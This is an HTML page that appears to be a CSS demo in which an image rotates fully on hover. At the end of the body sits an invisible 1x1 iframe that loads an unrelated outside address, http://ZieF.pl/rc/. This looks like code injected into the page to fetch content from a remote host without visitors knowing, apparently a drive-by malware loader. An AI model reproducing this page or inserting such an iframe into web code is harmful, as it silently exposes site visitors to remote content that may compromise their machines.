<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
    <style>
        .rotateZ{
            width: 330px;
            height: 227px;
            margin:100px auto;

            /* 透视*/
            perspective: 200px;
        }

        img{transition:all 1s;}

        .rotateZ:hover img{
            transform:rotateZ(360deg);
        }
    </style>
</head>
<body>
    <div class="rotateZ">
        <img src="images/z.jpg" alt=""/>
    </div>
<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>
